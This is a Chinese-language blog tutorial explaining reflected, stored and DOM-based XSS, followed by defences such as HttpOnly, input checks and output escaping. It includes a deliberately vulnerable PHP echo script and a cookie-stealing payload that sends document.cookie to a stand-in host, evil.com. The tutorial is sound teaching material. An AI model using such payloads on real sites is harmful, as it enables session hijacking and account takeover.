---
title: Web安全系列——XSS攻击
date: 2017-11-11 16:57:30
categories: "Web安全" 
tags: [Web安全]
---

>前段时间在学习Web安全方面的知识，对这方面有了进一步的了解，决定写文章记录下来，只是对Web安全方面知识的一些总结，没有太多的深度。  


## XSS攻击简介  
跨站脚本攻击(XSS),英文全称 Cross Site Script, 是Web安全头号大敌。  
XSS攻击，一般是指黑客通过在网页中**注入恶意脚本**，当用户浏览网页时，恶意脚本执行，控制用户浏览器行为的一种攻击方式。其中，XSS攻击通常分为反射型XSS、存储型XSS、DOM Based XSS三种。可以通过以下例子看看XSS攻击是如何产生的。
<!-- more -->

## 一个简单的例子

本地服务器的的/xssTest 目录下，有一个test.php文件，代码如下：
````
	<?php
		$userName=$_GET['userName'];					//获取用户输入的参数
		echo "<b>".$userName."</b>";					//直接输出用户的参数给前端页面
	?>
````
正常情况下，用户提交的姓名可以正确显示在页面上，不会构成XSS攻击，比如，当用户访问以下URL：

	http://localhost/xssTest/test.php?userName=jack

页面会显示：  
![正常显示](https://wx4.sinaimg.cn/mw690/857afa84gy1flfq8adc1hj20dx03y3yk.jpg)  
可以看到，用户在URL中输入的参数正常显示在页面上。  



然后，我们尝试在URL中**插入JavaScript代码**，如：  
````	
	http://localhost/xssTest/test.php?userName=<script>window.open(http://www.baidu.com)</script>
````
则页面会显示：  
![插入恶意脚本](https://wx4.sinaimg.cn/mw690/857afa84gy1flfq8q6g7bj20ok03h0ss.jpg)    

可以看到，页面没有把userName后面的内容显示出来，而且打开了一个新的标签页,原因是在URL中带有一段打开另一标签页的恶意脚本。  
这个例子虽然简短，但体现了最简单的XSS攻击的完整流程。  

## XSS攻击类型
根据攻击的方式，XSS攻击可以分为三类：反射型XSS、存储型XSS、DOM Based XSS。

**反射型XSS**也被称为非持久性XSS,这种攻击方式把XSS的Payload写在URL中，通过浏览器直接“反射"给用户。这种攻击方式通常需要诱使用户点击某个恶意链接，才能攻击成功。  
**存储型XSS**又被称为持久性XSS,会把黑客输入的恶意脚本存储在服务器的数据库中。当其他用户浏览页面包含这个恶意脚本的页面，用户将会受到黑客的攻击。一个常见的场景就是黑客写下一篇包含恶意JavaScript脚本的博客文章，当其他用户浏览这篇文章时，恶意的JavaScript代码将会执行。  
**DOM Based XSS** 是一种利用前端代码漏洞进行攻击的攻击方式。前面的反射型XSS与存储型XSS虽然恶意脚本的存放位置不同，但其本质都是利用后端代码的漏洞。  
反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，DOM Based中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。

## XSS攻击的危害
我们把进行XSS攻击的恶意脚本成为XSS Payload。XSS Payload的本质是JavaScript脚本，所以JavaScript可以做什么，XSS攻击就可以做什么。  
一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，以为着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。  
如下所示，攻击者先加载一个远程脚本：  
````
	http://localhost/xssTest/test.php?userName=<scriipt src=http://www.evil.com/evil.js></script>  
````
而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：
````
	var img=document.createElement("img");
	img.src="http://www.evil.com/log?"+escape(document.cookie);  
	document.body.appendChild(img);  
````
这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。  
一个网站的应用只需要接受HTTP的POST请求和GET请求，就可以完成所有的操作，对于黑客而言，仅通过JavaScript就可以完成这些操作。  
## 防御  
其实如今一些流行的浏览器都内置了一些对抗XSS的措施，比如Firefox的CSP、IE 8内置的XSS Filter等。除此之外，还有以下防御手段
### HttpOnly
HttpOnly最早是由微软提出，并在IE6中实现的，至今已逐渐成为一个标准。浏览器将禁止页面的JavaScript访问带有HttpOnly 属性的Cookie。以下浏览器开始支持HttpOnly:  


- Microsoft IE 6 SP1+  
- Mozilla FireFox 2.0.0.5+  
- Mozilla Firefox 3.0.0.6+  
- Google Chrome  
- Apple Safari 4.0+  
- Opera 9.5+

一个Cookie的使用过程如下：  
Step1: 浏览器向服务器发送请求，这时候没有cookie。   
Step2: 服务器返回同时，发送Set-Cookie头，向客户端浏览器写入Cookie。  
Step3: 在该Cookie到期前，浏览器访问该域名下所有的页面，都将发送该Cookie。  
而HttpOnly是在Set-Cookie时标记的。      
### 输入检查
常见的Web漏洞，如XSS、SQL注入等，都要求攻击者构造一些特殊的字符串，而这些字符串是一般用户不会用到的，所以进行输入检查就很有必要了。  
输入检查可以在用户输入的**格式检查**中进行。很多网站的用户名都要求是字母及数字的组合如“abc1234”，其实也能过滤一部分的XSS和SQL注入。但是，这种在客户端的限制很容易**被绕过**，攻击者可以用JavaScript或一些请求工具，直接构造请求，想网站注入XSS或者SQL。所以，除了在客户端进行格式检查，往往还需要在后端进行二次检查。客户端的检查主要作用是阻挡大部分误操作的正常用户，从而节约服务器资源。  
### 对输出转义
在输出数据之前对潜在的威胁的字符进行编码、转义是防御XSS攻击十分有效的措施。
为了对抗XSS,在HtmlEncode中至少转换以下字符：

< 转成 `&lt`;

`>` 转成 `&gt`;

& 转成 `&amp`;

" 转成 `&quot`;

' 转成 `&#39`  

----------


参考链接：  
[https://www.zhihu.com/question/26628342](https://www.zhihu.com/question/26628342 "DOM-based XSS 与存储性 XSS、反射型 XSS 有什么区别？")

《白帽子讲Web安全》
